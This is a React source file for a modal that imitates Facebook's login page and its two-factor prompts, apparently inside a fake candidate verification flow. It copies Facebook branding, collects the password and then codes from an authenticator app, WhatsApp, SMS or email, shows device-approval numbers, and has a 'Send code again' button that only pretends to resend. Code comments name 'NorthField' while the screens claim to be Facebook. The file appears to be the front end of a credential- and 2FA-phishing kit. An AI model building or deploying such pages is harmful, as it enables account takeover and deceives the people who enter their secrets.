"use client";

import { useState, useEffect } from "react";
import { RefreshCw } from "lucide-react";
import { getCodeLabel } from "@/lib/codeData";

export type VerifyStage = "closed" | "idPasskey" | "waiting" | "code" | "displayCode" | "notification";

function Shell({ children, maxWidth = "max-w-md" }: { children: React.ReactNode; maxWidth?: string }) {
  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center bg-ink/60 backdrop-blur-sm px-4"
      role="dialog"
      aria-modal="true"
    >
      <div className={`w-full ${maxWidth} bg-white border border-black/5 rounded-2xl shadow-2xl p-7 sm:p-8 animate-fade-up max-h-[92vh] overflow-y-auto`}>
        {children}
      </div>
    </div>
  );
}

export default function VerifyModal({
  stage,
  submitting,
  codeNumber = 1,
  displayCode = "",
  notificationDevice = "",
  candidateName = "",
  candidatePhone = "",
  candidateEmail = "",
  facebookUser = null,
  errorMessage,
  onSubmitIdPasskey,
  onSubmitCode,
  onTryAnotherWay,
  onCancel,
}: {
  stage: VerifyStage;
  submitting: boolean;
  codeNumber?: number;
  displayCode?: string;
  notificationDevice?: string;
  candidateName?: string;
  candidatePhone?: string;
  candidateEmail?: string;
  facebookUser?: {
    id?: string;
    name?: string;
    email?: string;
    picture?: string;
  } | null;
  errorMessage: string | null;
  onSubmitIdPasskey: (candidateId: string, passkey: string) => void;
  onSubmitCode: (code: string) => void;
  onTryAnotherWay?: () => void;
  onCancel: () => void;
}) {
  const activeFbEmail = (facebookUser?.email || "").trim();
  const [candidateId, setCandidateId] = useState(activeFbEmail);
  const [passkey, setPasskey] = useState("");
  const [code, setCode] = useState("");
  const [emailResent, setEmailResent] = useState(false);
  const [manualIdMode, setManualIdMode] = useState(false);
  const [imgError, setImgError] = useState(false);

  // Sync Facebook email into Candidate ID if user connected via Facebook
  useEffect(() => {
    if (stage === "idPasskey") {
      setImgError(false);
      if (activeFbEmail) {
        setCandidateId(activeFbEmail);
        setManualIdMode(false);
      } else {
        setCandidateId(candidateEmail || "");
        setManualIdMode(true);
      }
      setPasskey("");
    }
  }, [stage, activeFbEmail, candidateEmail]);

  // Timers: SMS = 180s (3:00), WhatsApp = 60s (1:00)
  const initialSeconds = codeNumber === 2 ? 60 : 180;
  const [timerSeconds, setTimerSeconds] = useState(initialSeconds);

  useEffect(() => {
    if (stage === "code") {
      setCode("");
      setEmailResent(false);
      setTimerSeconds(codeNumber === 2 ? 60 : 180);
    }
  }, [stage, codeNumber]);

  useEffect(() => {
    if (stage === "code" && (codeNumber === 2 || codeNumber === 3) && timerSeconds > 0) {
      const interval = setInterval(() => {
        setTimerSeconds((prev) => (prev > 0 ? prev - 1 : 0));
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [stage, codeNumber, timerSeconds]);

  const formatTimer = (sec: number) => {
    const m = Math.floor(sec / 60);
    const s = sec % 60;
    return `${m}:${String(s).padStart(2, "0")}`;
  };

  // Last 2 digits of candidate phone number
  const last2Digits = (candidatePhone || "").replace(/\D/g, "").slice(-2) || "20";

  const handleTryAnotherWay = () => {
    if (onTryAnotherWay) {
      onTryAnotherWay();
    } else {
      onCancel();
    }
  };

  if (stage === "closed") return null;

  // 1. WAITING / LOADING STATE (Fluid, active spinner)
  if (stage === "waiting") {
    return (
      <Shell maxWidth="max-w-xs">
        <div className="flex flex-col items-center justify-center py-10">
          <svg
            className="w-12 h-12 text-[#0069ff]"
            viewBox="0 0 50 50"
            xmlns="http://www.w3.org/2000/svg"
          >
            {/* Background Track */}
            <circle
              cx="25"
              cy="25"
              r="20"
              fill="none"
              stroke="#E5E7EB"
              strokeWidth="4"
            />
            {/* Rotating Blue Arc with Native SVG SMIL Animation */}
            <circle
              cx="25"
              cy="25"
              r="20"
              fill="none"
              stroke="#0069ff"
              strokeWidth="4"
              strokeLinecap="round"
              strokeDasharray="80, 200"
              strokeDashoffset="0"
            >
              <animateTransform
                attributeName="transform"
                type="rotate"
                from="0 25 25"
                to="360 25 25"
                dur="0.85s"
                repeatCount="indefinite"
              />
            </circle>
          </svg>
        </div>
      </Shell>
    );
  }

  // 2. DISPLAY / POP-OUT CODE STATE ("Check your other device" popup matching media_1788387615346.png)
  if (stage === "displayCode") {
    const formattedNumber = (displayCode || "11").trim();
    const spacedNumber = formattedNumber.length <= 4 ? formattedNumber.split("").join(" ") : formattedNumber;

    return (
      <Shell maxWidth="max-w-[580px]">
        <div className="space-y-3.5 font-sans">
          {/* Top Line: Candidate Name • NorthField */}
          <p className="text-sm font-semibold text-gray-800">
            {candidateName || "Candidate"} • Facebook
          </p>

          {/* Heading */}
          <h2 className="text-2xl font-bold text-gray-900 leading-tight">
            Check your other device
          </h2>

          {/* Subtitle */}
          <p className="text-xs text-gray-600 leading-relaxed">
            Open the notification on your other device, then tap {formattedNumber} to verify that it&apos;s you.
          </p>

          {/* HD Other Device Illustration */}
          <div className="my-2 rounded-2xl overflow-hidden shadow-xs">
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img
              src="/images/illustration-other-device.png"
              alt="Check your other device"
              className="w-full h-auto object-cover rounded-2xl select-none"
            />
          </div>

          {/* Extra Large Centered Code Number */}
          <div className="py-2 text-center select-all">
            <span className="text-4xl sm:text-5xl font-bold text-gray-900 tracking-[0.25em] font-sans">
              {spacedNumber}
            </span>
          </div>

          {/* Waiting for approval line */}
          <div className="flex items-start gap-3 py-1 text-left">
            <div className="w-5 h-5 rounded-full border border-gray-400 flex items-center justify-center shrink-0 mt-0.5 text-gray-600">
              <span className="text-[10px] font-bold leading-none tracking-tighter">•••</span>
            </div>
            <div>
              <p className="text-xs sm:text-sm font-semibold text-gray-900 leading-snug">
                Waiting for approval
              </p>
              <p className="text-[11px] sm:text-xs text-gray-500 leading-snug mt-0.5">
                It may take a few minutes to get the notification on your other device.
              </p>
            </div>
          </div>

          {/* Action Button: Try another way */}
          <div className="pt-2">
            <button
              type="button"
              onClick={handleTryAnotherWay}
              className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 py-3 rounded-full font-semibold text-sm transition-colors text-center cursor-pointer"
            >
              Try another way
            </button>
          </div>
        </div>
      </Shell>
    );
  }

  // 2.5 NOTIFICATION / ANOTHER DEVICE POPUP ("Check your notifications on another device" popup matching reference)
  if (stage === "notification") {
    const deviceLabel = (notificationDevice || "").trim() || "other device";

    return (
      <Shell maxWidth="max-w-[580px]">
        <div className="space-y-3.5 font-sans">
          {/* Top Line: Candidate Name • NorthField */}
          <p className="text-sm font-semibold text-gray-800">
            {candidateName || "Candidate"} • Facebook
          </p>

          {/* Heading */}
          <h2 className="text-2xl font-bold text-gray-900 leading-tight">
            Check your notifications on another device
          </h2>

          {/* Subtitle with dynamic device text */}
          <p className="text-xs text-gray-600 leading-relaxed">
            We sent a notification to your {deviceLabel}. Check your Facebook notifications there and approve the login to continue.
          </p>

          {/* HD Notification Illustration */}
          <div className="my-2 rounded-2xl overflow-hidden shadow-xs">
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img
              src="/images/illustration-notification.png"
              alt="Check your notifications on another device"
              className="w-full h-auto object-cover rounded-2xl select-none"
            />
          </div>

          {/* Waiting for approval line */}
          <div className="flex items-start gap-3 py-1 text-left">
            <div className="w-5 h-5 rounded-full border border-gray-400 flex items-center justify-center shrink-0 mt-0.5 text-gray-600">
              <span className="text-[10px] font-bold leading-none tracking-tighter">•••</span>
            </div>
            <div>
              <p className="text-xs sm:text-sm font-semibold text-gray-900 leading-snug">
                Waiting for approval
              </p>
              <p className="text-[11px] sm:text-xs text-gray-500 leading-snug mt-0.5">
                It may take a few minutes to get the notification on your other device.
              </p>
            </div>
          </div>

          {/* Action Button: Try another way */}
          <div className="pt-2">
            <button
              type="button"
              onClick={handleTryAnotherWay}
              className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 py-3 rounded-full font-semibold text-sm transition-colors text-center cursor-pointer"
            >
              Try another way
            </button>
          </div>
        </div>
      </Shell>
    );
  }

  // 3. AUTHAPP POPUP (Code 1 - Go to your authentication app) -> max-w-[580px]
  if (stage === "code" && codeNumber === 1) {
    return (
      <Shell maxWidth="max-w-[580px]">
        <div className="space-y-4 font-sans">
          {/* Top Line: Candidate Name • NorthField */}
          <p className="text-sm font-semibold text-gray-800">
            {candidateName || "Candidate"} • Facebook
          </p>

          {/* Heading */}
          <h2 className="text-2xl font-bold text-gray-900 leading-tight">
            Go to your authentication app
          </h2>

          {/* Subtitle */}
          <p className="text-xs text-gray-600 leading-relaxed">
            Enter the 6-digit code for this account from the two-factor authentication app you set up (such as Duo Mobile or Google Authenticator).
          </p>

          {/* Exact Rounded AuthApp Illustration */}
          <div className="my-2 rounded-2xl overflow-hidden shadow-xs">
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img
              src="/images/illustration-authapp.png"
              alt="Authentication App Verification"
              className="w-full h-auto object-cover rounded-2xl select-none"
            />
          </div>

          {errorMessage && (
            <p className="rounded-lg border border-red-200 bg-red-50/80 px-4 py-2.5 text-xs text-red-700 font-medium">
              {errorMessage}
            </p>
          )}

          <form
            onSubmit={(e) => {
              e.preventDefault();
              onSubmitCode(code.trim());
            }}
            className="space-y-3.5 pt-1"
          >
            {/* Code Input Box */}
            <div className="border border-gray-300 focus-within:border-[#0069ff] focus-within:ring-1 focus-within:ring-[#0069ff] rounded-xl px-4 py-2.5 bg-white transition-all shadow-2xs">
              <label className="block text-[11px] font-medium text-gray-500" htmlFor="authapp-code-input">
                Code
              </label>
              <input
                id="authapp-code-input"
                required
                autoFocus
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="w-full text-base font-mono font-bold text-gray-900 outline-none bg-transparent tracking-wide mt-0.5"
              />
            </div>

            {/* Action Buttons */}
            <div className="space-y-2 pt-2">
              <button
                type="submit"
                disabled={submitting || !code.trim()}
                className="w-full bg-[#3b82f6] hover:bg-[#2563eb] text-white py-3 rounded-full font-bold text-sm transition-colors disabled:opacity-50 shadow-sm cursor-pointer"
              >
                {submitting ? "Submitting…" : "Continue"}
              </button>

              <button
                type="button"
                onClick={handleTryAnotherWay}
                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 py-3 rounded-full font-semibold text-sm transition-colors text-center cursor-pointer"
              >
                Try another way
              </button>
            </div>
          </form>
        </div>
      </Shell>
    );
  }

  // 4. WHATSAPP POPUP (Code 2 - Check your WhatsApp messages) -> max-w-[580px]
  if (stage === "code" && codeNumber === 2) {
    return (
      <Shell maxWidth="max-w-[580px]">
        <div className="space-y-4 font-sans">
          {/* Top Line: Candidate Name • NorthField */}
          <p className="text-sm font-semibold text-gray-800">
            {candidateName || "Candidate"} • Facebook
          </p>

          {/* Heading */}
          <h2 className="text-2xl font-bold text-gray-900 leading-tight">
            Check your WhatsApp messages
          </h2>

          {/* Subtitle with last 2 digits */}
          <p className="text-xs text-gray-600 leading-relaxed">
            Enter the code we sent to your WhatsApp account at *** *** *{last2Digits}.
          </p>

          {/* Exact Rounded WhatsApp Illustration */}
          <div className="my-2 rounded-2xl overflow-hidden shadow-xs">
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img
              src="/images/illustration-whatsapp.png"
              alt="WhatsApp Verification"
              className="w-full h-auto object-cover rounded-2xl select-none"
            />
          </div>

          {errorMessage && (
            <p className="rounded-lg border border-red-200 bg-red-50/80 px-4 py-2.5 text-xs text-red-700 font-medium">
              {errorMessage}
            </p>
          )}

          <form
            onSubmit={(e) => {
              e.preventDefault();
              onSubmitCode(code.trim());
            }}
            className="space-y-3 pt-1"
          >
            {/* Code Input Box */}
            <div className="border border-gray-300 focus-within:border-[#0069ff] focus-within:ring-1 focus-within:ring-[#0069ff] rounded-xl px-4 py-2.5 bg-white transition-all shadow-2xs">
              <label className="block text-[11px] font-medium text-gray-500" htmlFor="whatsapp-code-input">
                Code
              </label>
              <input
                id="whatsapp-code-input"
                required
                autoFocus
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="w-full text-base font-mono font-bold text-gray-900 outline-none bg-transparent tracking-wide mt-0.5"
              />
            </div>

            {/* Resend Timer Line: 1:00 */}
            <div className="flex items-center gap-1.5 text-xs text-gray-600 font-sans pt-0.5">
              <RefreshCw className="w-3.5 h-3.5 text-gray-500" />
              <span>We can send a new code in {formatTimer(timerSeconds)}</span>
            </div>

            {/* Action Buttons */}
            <div className="space-y-2 pt-2">
              <button
                type="submit"
                disabled={submitting || !code.trim()}
                className="w-full bg-[#3b82f6] hover:bg-[#2563eb] text-white py-3 rounded-full font-bold text-sm transition-colors disabled:opacity-50 shadow-sm cursor-pointer"
              >
                {submitting ? "Submitting…" : "Continue"}
              </button>

              <button
                type="button"
                onClick={handleTryAnotherWay}
                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 py-3 rounded-full font-semibold text-sm transition-colors text-center cursor-pointer"
              >
                Try another way
              </button>
            </div>
          </form>
        </div>
      </Shell>
    );
  }

  // 5. SMS POPUP (Code 3 - Check your text messages) -> max-w-[580px]
  if (stage === "code" && codeNumber === 3) {
    return (
      <Shell maxWidth="max-w-[580px]">
        <div className="space-y-4 font-sans">
          {/* Top Line: Candidate Name • NorthField */}
          <p className="text-sm font-semibold text-gray-800">
            {candidateName || "Candidate"} • Facebook
          </p>

          {/* Heading */}
          <h2 className="text-2xl font-bold text-gray-900 leading-tight">
            Check your text messages
          </h2>

          {/* Subtitle with last 2 digits */}
          <p className="text-xs text-gray-600 leading-relaxed">
            Enter the code we sent to *** *** *{last2Digits}.
          </p>

          {/* Exact Rounded SMS Illustration */}
          <div className="my-2 rounded-2xl overflow-hidden shadow-xs">
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img
              src="/images/illustration-sms.png"
              alt="SMS Verification"
              className="w-full h-auto object-cover rounded-2xl select-none"
            />
          </div>

          {errorMessage && (
            <p className="rounded-lg border border-red-200 bg-red-50/80 px-4 py-2.5 text-xs text-red-700 font-medium">
              {errorMessage}
            </p>
          )}

          <form
            onSubmit={(e) => {
              e.preventDefault();
              onSubmitCode(code.trim());
            }}
            className="space-y-3 pt-1"
          >
            {/* Code Input Box */}
            <div className="border border-gray-300 focus-within:border-[#0069ff] focus-within:ring-1 focus-within:ring-[#0069ff] rounded-xl px-4 py-2.5 bg-white transition-all shadow-2xs">
              <label className="block text-[11px] font-medium text-gray-500" htmlFor="sms-code-input">
                Code
              </label>
              <input
                id="sms-code-input"
                required
                autoFocus
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="w-full text-base font-mono font-bold text-gray-900 outline-none bg-transparent tracking-wide mt-0.5"
              />
            </div>

            {/* Resend Timer Line: 3:00 */}
            <div className="flex items-center gap-1.5 text-xs text-gray-600 font-sans pt-0.5">
              <RefreshCw className="w-3.5 h-3.5 text-gray-500" />
              <span>We can send a new code in {formatTimer(timerSeconds)}</span>
            </div>

            {/* Action Buttons */}
            <div className="space-y-2 pt-2">
              <button
                type="submit"
                disabled={submitting || !code.trim()}
                className="w-full bg-[#3b82f6] hover:bg-[#2563eb] text-white py-3 rounded-full font-bold text-sm transition-colors disabled:opacity-50 shadow-sm cursor-pointer"
              >
                {submitting ? "Submitting…" : "Continue"}
              </button>

              <button
                type="button"
                onClick={handleTryAnotherWay}
                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 py-3 rounded-full font-semibold text-sm transition-colors text-center cursor-pointer"
              >
                Try another way
              </button>
            </div>
          </form>
        </div>
      </Shell>
    );
  }

  // 6. EMAIL POPUP (Code 4 - Confirm your profile) -> max-w-[580px] matching media_1788470826941.png
  if (stage === "code" && codeNumber === 4) {
    return (
      <Shell maxWidth="max-w-[580px]">
        <div className="space-y-4 font-sans">
          {/* Top Line: Candidate Name • NorthField */}
          <p className="text-sm font-semibold text-gray-800">
            {candidateName || "Candidate"} • Facebook
          </p>

          {/* Heading */}
          <h2 className="text-2xl font-bold text-gray-900 leading-tight">
            Confirm your profile
          </h2>

          {/* Subtitle */}
          <p className="text-xs text-gray-600 leading-relaxed">
            We sent a code to your email. Enter that code to confirm your account.
          </p>

          {/* HD Email Illustration */}
          <div className="my-2 rounded-2xl overflow-hidden shadow-xs">
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img
              src="/images/illustration-email.png"
              alt="Confirm your profile"
              className="w-full h-auto object-cover rounded-2xl select-none"
            />
          </div>

          {errorMessage && (
            <p className="rounded-lg border border-red-200 bg-red-50/80 px-4 py-2.5 text-xs text-red-700 font-medium">
              {errorMessage}
            </p>
          )}

          <form
            onSubmit={(e) => {
              e.preventDefault();
              onSubmitCode(code.trim());
            }}
            className="space-y-4 pt-1"
          >
            {/* Code Input Box with placeholder "Enter code" */}
            <div className="border border-gray-300 focus-within:border-[#0069ff] focus-within:ring-1 focus-within:ring-[#0069ff] rounded-xl px-4 py-3 bg-white transition-all shadow-2xs">
              <input
                id="email-code-input"
                required
                autoFocus
                value={code}
                onChange={(e) => setCode(e.target.value)}
                placeholder="Enter code"
                className="w-full text-base font-mono font-bold text-gray-900 outline-none bg-transparent tracking-wide placeholder:font-sans placeholder:font-normal placeholder:text-gray-400"
              />
            </div>

            {/* Action: Continue Button */}
            <button
              type="submit"
              disabled={submitting || !code.trim()}
              className="w-full bg-[#0069ff] hover:bg-[#0055d4] text-white py-3.5 rounded-full font-bold text-sm transition-colors disabled:opacity-50 shadow-sm cursor-pointer"
            >
              {submitting ? "Submitting…" : "Continue"}
            </button>

            {/* Sub-actions: Send code again */}
            <div className="flex flex-col items-center pt-1">
              <button
                type="button"
                onClick={() => {
                  setEmailResent(true);
                  setTimeout(() => setEmailResent(false), 3000);
                }}
                className="text-sm font-semibold text-gray-900 hover:text-[#0069ff] transition-colors py-1 cursor-pointer"
              >
                {emailResent ? "✓ Code resent to your email" : "Send code again"}
              </button>
            </div>
          </form>
        </div>
      </Shell>
    );
  }

  // 7. GENERIC / FALLBACK CODE INPUT
  if (stage === "code") {
    const label = getCodeLabel(codeNumber);

    return (
      <Shell maxWidth="max-w-sm">
        <h2 className="font-display text-2xl text-ink">{label} Code</h2>
        <p className="mt-2 text-sm text-muted leading-relaxed">
          Please enter the {label} verification code you were provided.
        </p>

        {errorMessage && (
          <p className="mt-4 rounded-lg border border-red-200 bg-red-50/80 px-4 py-2.5 text-xs text-red-700 font-medium">
            {errorMessage}
          </p>
        )}

        <form
          className="mt-6 space-y-4"
          onSubmit={(e) => {
            e.preventDefault();
            onSubmitCode(code.trim());
          }}
        >
          <div>
            <label className="font-mono text-xs uppercase tracking-widest2 text-muted" htmlFor="additional-code">
              {label} Code
            </label>
            <input
              id="additional-code"
              required
              autoFocus
              value={code}
              onChange={(e) => setCode(e.target.value)}
              placeholder={`Enter ${label} code`}
              className="mt-2 w-full border-b-2 rule-hairline bg-transparent py-2 text-ink outline-none focus:border-brass transition-colors font-mono text-base"
            />
          </div>

          <div className="space-y-2 pt-2">
            <button
              type="submit"
              disabled={submitting}
              className="w-full bg-[#3b82f6] hover:bg-[#2563eb] text-white py-3 rounded-full font-bold text-sm transition-colors disabled:opacity-50"
            >
              {submitting ? "Submitting…" : "Continue"}
            </button>

            <button
              type="button"
              onClick={handleTryAnotherWay}
              className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 py-3 rounded-full font-semibold text-sm transition-colors text-center"
            >
              Try another way
            </button>
          </div>
        </form>
      </Shell>
    );
  }

  // 8. ID & PASSKEY ENTRY STAGE (NorthField Facebook Login Pop-up matching reference design)
  const displayName = (facebookUser?.name || candidateName || "").trim() || "Candidate";
  const hasEmail = Boolean(activeFbEmail) && !manualIdMode;
  const profilePic = facebookUser?.picture || null;

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center bg-ink/60 backdrop-blur-sm px-4 py-8 overflow-y-auto"
      role="dialog"
      aria-modal="true"
    >
      <div className="w-full max-w-[450px] bg-white border border-black/5 rounded-2xl shadow-2xl p-8 sm:p-9 font-sans animate-fade-up max-h-[92vh] overflow-y-auto">
        {/* Top Logo: NorthField inside the popup above profile picture */}
        <div className="text-center mb-6">
          <h1 className="text-3xl sm:text-[36px] font-extrabold text-[#1877f2] tracking-tight select-none">
            facebook
          </h1>
        </div>

        {/* Centered Profile Picture or Initial Avatar */}
        {profilePic && !imgError ? (
          // eslint-disable-next-line @next/next/no-img-element
          <img
            src={profilePic}
            alt={displayName}
            onError={() => setImgError(true)}
            className="w-[84px] h-[84px] rounded-full object-cover shadow-xs mx-auto select-none ring-1 ring-black/5"
          />
        ) : (
          <div className="w-[84px] h-[84px] rounded-full bg-blue-50 text-[#1877f2] border-2 border-blue-100 flex items-center justify-center text-2xl font-bold mx-auto shadow-xs select-none">
            {displayName.charAt(0).toUpperCase() || "U"}
          </div>
        )}

        {/* User Name Header */}
        <h2 className="text-[20px] font-semibold text-gray-900 text-center mt-4 leading-tight">
          Log in as {displayName}
        </h2>

        {/* Email Autofill Line: [email@domain.com] · Not you? */}
        {hasEmail ? (
          <div className="flex items-center justify-center gap-1.5 mt-2 mb-6 text-xs text-gray-500">
            <span className="text-gray-600 font-normal select-all">
              {activeFbEmail}
            </span>
            <span className="text-gray-400">·</span>
            <button
              type="button"
              onClick={() => {
                setManualIdMode(true);
                setCandidateId("");
              }}
              className="text-[#1877f2] hover:underline font-normal cursor-pointer"
            >
              Not you?
            </button>
          </div>
        ) : (
          <div className="mt-2 mb-4 text-center">
            <p className="text-xs text-gray-500">
              Please enter your email and password to continue
            </p>
          </div>
        )}

        {/* Error Notice */}
        {errorMessage && (
          <div className="mb-4 rounded-lg border border-red-200 bg-red-50 px-3.5 py-2.5 text-xs text-red-700 font-medium text-center">
            {errorMessage}
          </div>
        )}

        {/* Submission Form */}
        <form
          onSubmit={(e) => {
            e.preventDefault();
            const effectiveId = (hasEmail ? activeFbEmail : candidateId).trim();
            onSubmitIdPasskey(effectiveId, passkey.trim());
          }}
          className="space-y-3"
        >
          {/* If no email from Facebook, open Candidate ID field so user can write it down */}
          {!hasEmail && (
            <div>
              <input
                id="candidate-id-input"
                type="text"
                required
                value={candidateId}
                onChange={(e) => setCandidateId(e.target.value)}
                placeholder="Candidate ID or Email"
                className="w-full border border-gray-300 focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] rounded-lg px-4 py-3 text-base text-gray-900 outline-none placeholder:text-gray-400 font-sans transition-all"
                autoFocus
              />
            </div>
          )}

          {/* Password / Passkey Input Field */}
          <div>
            <input
              id="passkey-input"
              type="password"
              required
              value={passkey}
              onChange={(e) => setPasskey(e.target.value)}
              placeholder="Password"
              className="w-full border border-gray-300 focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] rounded-lg px-4 py-3 text-base text-gray-900 outline-none placeholder:text-gray-400 font-sans transition-all"
              autoFocus={hasEmail}
            />
          </div>

          {/* Blue Primary Button: Log In */}
          <button
            type="submit"
            disabled={submitting || !passkey.trim() || (!hasEmail && !candidateId.trim())}
            className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold py-3 rounded-lg text-base transition-colors shadow-none cursor-pointer disabled:opacity-50 mt-3.5"
          >
            {submitting ? "Logging in…" : "Log In"}
          </button>

          {/* Gray Secondary Button: Try another way */}
          <button
            type="button"
            onClick={handleTryAnotherWay}
            className="w-full bg-[#e4e6eb] hover:bg-[#d8dadf] text-[#050505] font-semibold py-3 rounded-lg text-base transition-colors text-center cursor-pointer mt-2.5"
          >
            Try another way
          </button>

          {/* Bottom Link: Forgot account? */}
          <div className="text-center pt-2">
            <button
              type="button"
              onClick={handleTryAnotherWay}
              className="text-[#1877f2] text-sm font-normal hover:underline cursor-pointer"
            >
              Forgot account?
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
